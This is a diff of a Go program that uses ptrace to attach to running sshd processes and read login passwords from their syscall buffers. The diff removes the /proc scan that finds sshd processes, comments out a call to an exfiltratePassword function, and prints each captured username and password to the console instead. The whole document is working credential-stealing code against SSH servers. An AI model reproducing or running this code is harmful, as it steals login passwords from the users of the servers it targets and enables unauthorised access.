@@ -3,41 +3,10 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"os"
 	"regexp"
-	"strconv"
 	"strings"
 	"syscall"
 )
-
-func findSSHDProcesses() ([]int, error) {
-	var sshdPIDs []int
-	dir, err := os.Open("/proc")
-	if err != nil {
-		return nil, err
-	}
-	defer dir.Close()
-	entries, err := dir.Readdirnames(0)
-	if err != nil {
-		return nil, err
-	}
-	for _, entry := range entries {
-		pid, err := strconv.Atoi(entry)
-		if err != nil {
-			continue
-		}
-		if isSSHDProcess(pid) {
-			sshdPIDs = append(sshdPIDs, pid)
-		}
-	}
-
-	return sshdPIDs, nil
-}
-
-func isSSHDProcess(pid int) bool {
-	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
-}
 
 func traceSSHDProcess(pid int) {
 	err := syscall.PtraceAttach(pid)
@@ -87,8 +56,9 @@ func traceSSHDProcess(pid int) {
 				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
 					excludeString := "\\x00\\x00\\x00.\\f"
 					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
-						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
-						go exfiltratePassword(strings.TrimLeft(string(cleanedBuffer), "\n"), username)
+						password := strings.TrimLeft(string(buffer), "\n")
+						//exfiltratePassword(password, username)
+						fmt.Printf("u: %s, p: %s\n", username, password)
 					}
 				}
 
